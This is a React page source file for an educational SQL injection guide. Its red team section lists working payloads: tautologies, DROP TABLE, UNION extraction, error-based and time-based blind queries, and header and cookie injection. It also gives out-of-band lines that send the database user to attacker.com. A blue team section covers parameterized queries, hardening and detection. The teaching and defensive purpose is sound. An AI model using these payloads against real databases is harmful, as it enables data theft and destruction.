/* eslint-disable react/no-unescaped-entities */
// File: /app/sql-injection/page.tsx
export default function SQLInjectionPage() {
  return (
    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">SQL Injection (SQLi)</h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is SQL Injection?</h2>
        <p className="leading-relaxed">
          SQL Injection is one of the most dangerous and widespread web application vulnerabilities. It arises when untrusted user input is directly embedded into SQL queries without proper sanitization, allowing attackers to modify the intended query behavior.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">SQLi Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Unauthorized data access (PII, credentials, sensitive data)</li>
            <li>Database modification or deletion</li>
            <li>Authentication bypass</li>
            <li>Remote code execution</li>
            <li>Complete system compromise</li>
          </ul>
        </div>
      </section>






      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>





        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic SQL-Injection Testing</h3>
          
          <p className="text-gray-300 mb-4">
            Classic SQL Injection occurs when unsanitized user input is directly inserted into an SQL query, allowing attackers to manipulate the query structure. This can result in unauthorized access, data leakage, or full database compromise. It's one of the earliest and most well-known web application vulnerabilities.
          </p>
          <h4 className="font-medium mb-1 mt-3">Common Payloads</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`' OR '1'='1
" OR "" = "
' OR 1=1--
'; DROP TABLE users--`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Error-Based Detection</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, db_name())--`}
          </pre>
        </article>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Union-Based SQL-Injection</h3>

          <p className="text-gray-300 mb-4">
            UNION-Based SQL Injection leverages the SQL <code className="text-red-300">UNION</code> operator to combine results from multiple queries into a single response. If the original query returns data that is shown on the page, the attacker can inject additional queries using <code className="text-red-300">UNION SELECT</code> to retrieve sensitive information such as usernames, passwords, or version info.
          </p>
          
          <h4 className="font-medium mb-1 mt-3">Column Enumeration</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`ORDER BY 1-- 
ORDER BY 2--
...
ORDER BY 10--`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Data Extraction</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`UNION SELECT 1,2,3,4--
UNION SELECT null,table_name,null FROM information_schema.tables--
UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--`}
          </pre>
        </article>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Blind SQL-Injection</h3>

          <p className="text-gray-300 mb-4">
            Blind Injection is a type of SQL Injection attack where the attacker cannot see the direct output of their payloads on the web page. Instead, they infer information from the behavior of the application—such as changes in page content, timing, or response codes—to extract data from the database. It's often used when error messages or query results are not visible to the attacker.
          </p>
          
          <h4 className="font-medium mb-1 mt-3">Boolean-Based</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`AND SUBSTRING((SELECT @@version),1,1)='M'
AND (SELECT COUNT(*) FROM users) > 10`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Time-Based</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`MySQL: AND IF(1=1,SLEEP(5),0)
MSSQL: WAITFOR DELAY '0:0:5'
Oracle: AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)`}
          </pre>
        </article>




        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. SQL Injection via HTTP Headers</h3>

          <p className="mb-3">
            Some web applications improperly trust HTTP header values such as <code>User-Agent</code>, <code>Referer</code>, and <code>X-Forwarded-For</code> and include them directly in SQL queries without proper sanitization, leading to injection vulnerabilities.
          </p>

          <h4 className="font-medium mb-1">Example: Malicious Header Injection</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`GET /profile HTTP/1.1
Host: vulnerable.com
User-Agent: ' OR 1=1--`}
          </pre>

          <h4 className="font-medium mb-1">Sample Payloads in Headers</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`X-Forwarded-For: 127.0.0.1' OR SLEEP(5)--
Referer: ' UNION SELECT username, password FROM users--`}
          </pre>


        </article>







<article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. SQL Injection via Cookies</h3>

          <p className="mb-3">
            Cookies are client-controlled data sent with requests. If an application uses cookie values directly in SQL queries without proper sanitization, attackers can inject malicious SQL to exploit the database.
          </p>

          <h4 className="font-medium mb-1">Example: Malicious Cookie Injection</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`Cookie: sessionId=xyz' OR '1'='1`}
          </pre>

          <h4 className="font-medium mb-1">Sample Payloads in Cookies</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`Cookie: authToken=abc' OR 'x'='x
Cookie: userPref=1'; DROP TABLE users--`}
          </pre>


        </article>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">6. Error-Based SQL Injection</h3>

          <p className="mb-3">
            Error-Based SQL Injection exploits the databases error messages to extract information. Attackers intentionally cause the database to produce errors that include valuable details such as table names, column names, or even data.
          </p>

          <h4 className="font-medium mb-1">How It Works</h4>
          <p className="mb-3">
            By injecting malformed SQL syntax or using specific database functions that cause errors, attackers can view database error responses directly in the web application's output if error handling is insufficient.
          </p>

          <h4 className="font-medium mb-1">Example: Forcing an Error to Leak Data</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`http://example.com/page.php?id=1' AND updatexml(null, concat(0x7e, (SELECT user())), null)--`}
          </pre>
          <p className="text-sm text-gray-400 mb-3">
            This payload uses MySQLs <code>updatexml()</code> function to force an XML parsing error that leaks the database user.
          </p>

          <h4 className="font-medium mb-1">Common Error-Based Payloads</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
`}
          </pre>


        </article>




        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">7. Time-Based Blind SQL Injection</h3>

          <p className="mb-3">
            Time-Based Blind SQL Injection is used when an application does not return error messages or data directly, but the attacker can infer information by observing time delays in the application's response caused by specially crafted SQL queries.
          </p>

          <h4 className="font-medium mb-1">How It Works</h4>
          <p className="mb-3">
            Attackers inject SQL that forces the database to wait (sleep) for a certain period if a condition is true. By measuring the time it takes for the server to respond, the attacker can infer whether the condition holds, gradually extracting data one bit at a time.
          </p>

          <h4 className="font-medium mb-1">Common Time-Based Payloads</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`-- MySQL
?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)

-- Microsoft SQL Server
?id=1; IF (SUBSTRING((SELECT @@version),1,1)='M') WAITFOR DELAY '00:00:05'--

-- Oracle
?id=1 AND 1=(CASE WHEN (SUBSTR((SELECT user FROM dual),1,1)='A') THEN TO_CHAR(DBMS_LOCK.SLEEP(5)) ELSE 1 END)`}
          </pre>

          <h4 className="font-medium mb-1">Example</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`http://example.com/item?id=1 AND IF(SUBSTRING((SELECT user()),1,1)='r', SLEEP(5), 0)--`}
          </pre>
          <p className="text-sm text-gray-400 mb-3">
            This payload checks if the first character of the database user is "r". If true, the server pauses for 5 seconds, indicating a positive result.
          </p>


        </article>





        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">8. Out-of-Band (OOB) SQL Injection</h3>

          <p className="mb-3">
            Out-of-Band SQL Injection occurs when attackers use the database’s ability to make network requests to external servers to exfiltrate data or interact with external systems. This method is especially useful when the application does not directly return data or errors.
          </p>

          <h4 className="font-medium mb-1">How It Works</h4>
          <p className="mb-3">
            The attacker injects payloads that cause the database to send DNS or HTTP requests to a server they control. By monitoring these requests, the attacker can extract information such as database names, user credentials, or other sensitive data.
          </p>

          <h4 className="font-medium mb-1">Common OOB Techniques</h4>
          <ul className="list-disc list-inside ml-4 mb-4 space-y-1">
            <li><strong>DNS Exfiltration:</strong> Using database functions to trigger DNS lookups containing data encoded in subdomains.</li>
            <li><strong>HTTP Requests:</strong> Making HTTP requests to attacker-controlled servers via functions like <code>xp_dirtree</code> in MSSQL or <code>UTL_HTTP.REQUEST</code> in Oracle.</li>
          </ul>

          <h4 className="font-medium mb-1">Example: MSSQL DNS Lookup</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`'; EXEC master..xp_dirtree '\\attacker.com\${user}\'--`}
          </pre>
          <p className="text-sm text-gray-400 mb-3">
            This payload forces the database server to perform a DNS lookup to the attacker’s domain with the database user appended, leaking the user info externally.
          </p>

          <h4 className="font-medium mb-1">Example: Oracle HTTP Request</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto mb-3">
{`'; BEGIN
  UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual));
END;--`}
          </pre>
          <p className="text-sm text-gray-400 mb-3">
            This triggers an HTTP request to the attacker’s server including the current database user.
          </p>


        </article>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">SQL Injection Tools & Automation</h3>

          <h4 className="font-medium mb-1 mt-3">Discovery & Scanning</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>sqlmap – Automated SQL injection and database takeover tool</li>
            <li>Burp Suite Scanner – Active scanning and detection of SQLi</li>
            <li>sqlninja – Exploitation tool for Microsoft SQL Server injection</li>
            <li>Havij – User-friendly automated SQL injection tool</li>
            <li>jSQL Injection – Lightweight SQLi detection and exploitation tool</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Exploitation & Payload Generation</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>sqlmap – Supports automated payload generation and exploitation</li>
            <li>sqlninja – Targeted exploitation for MSSQL</li>
            <li>Havij – Automated extraction and payload crafting</li>
            <li>Manual payload crafting with tools like Burp Repeater</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Post-Exploitation & Reporting</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>sqlmap – Database takeover, file system access, command execution</li>
            <li>Burp Suite Intruder – Custom payload fuzzing</li>
            <li>Automated reporting and exporting of findings</li>
          </ul>
        </article>

      </section>


















      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Secure Coding</h3>
          
          <h4 className="font-medium mb-1 mt-3">Parameterized Queries</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Python with psycopg2
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

// Java with PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
  "SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">ORM Best Practices</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Django ORM (safe)
User.objects.raw('SELECT * FROM users WHERE username = %s', [username])

# Never do this (vulnerable)
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Input Validation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Whitelisting</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Only allow alphanumeric for usernames
if (!username.matches("^[a-zA-Z0-9]+$")) {
  throw new ValidationException("Invalid username");
}`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Type Safety</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// For numeric IDs, parse early
int id = Integer.parseInt(request.getParameter("id"));
// This will throw NumberFormatException for SQLi attempts`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Database Hardening</h3>
          
          <h4 className="font-medium mb-1 mt-3">Least Privilege</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>READ ONLY for reporting</li>
            <li>No DROP/CREATE for app users</li>
            <li>Disable xp_cmdshell in MSSQL</li>
            <li>Restrict FILE privilege in MySQL</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Secure Configurations</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Disable verbose errors</li>
            <li>Use stored procedures carefully</li>
            <li>Enable only needed DB functions</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Runtime Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">WAF Rules</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Block common SQLi patterns</li>
            <li>Rate limit parameter fuzzing</li>
            <li>Virtual patching for known vulns</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">RASP</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Runtime Application Self-Protection</li>
            <li>Blocks malicious SQL at runtime</li>
            <li>Provides attack telemetry</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Monitoring & Response</h3>
          
          <h4 className="font-medium mb-1 mt-3">Detection Signatures</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>UNION SELECT in queries</li>
            <li>Multiple OR/AND conditions</li>
            <li>SLEEP/WATTFOR commands</li>
            <li>Information_schema access</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Log Analysis</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>SIEM integration</li>
            <li>Anomaly detection</li>
            <li>Query timing analysis</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Incident Response</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Query kill switches</li>
            <li>Automatic session termination</li>
            <li>Forensic query logging</li>
          </ul>
        </article>
      </section>


      <div className="mb-12 p-4 bg-gray-800 rounded-lg border-l-4 border-blue-500">
        <h3 className="text-lg font-semibold mb-2 text-blue-400">SQL Injection Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Use parameterized queries/prepared statements exclusively</li>
          <li>Implement strict input validation (whitelisting preferred)</li>
          <li>Apply principle of least privilege to database accounts</li>
          <li>Disable verbose error messages in production</li>
          <li>Regularly update database software and libraries</li>
          <li>Implement WAF rules for SQLi patterns</li>
          <li>Monitor for suspicious database activity</li>
          <li>Conduct regular security testing and code reviews</li>
        </ul>
      </div>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PortSwigger SQL Injection Academy — Interactive labs
                </a>
              </li>
              <li>
                <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP SQL Injection — Comprehensive documentation
                </a>
              </li>
              <li>
                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PayloadsAllTheThings SQLi — Cheat sheet
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://sqlmap.org/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  SQLMap — Automated SQL injection tool
                </a>
              </li>
              <li>
                <a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  jSQL Injection — Java-based GUI tool
                </a>
              </li>
              <li>
                <a href="https://github.com/codingo/NoSQLMap" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  NoSQLMap — For NoSQL injection
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </main>
  );
}
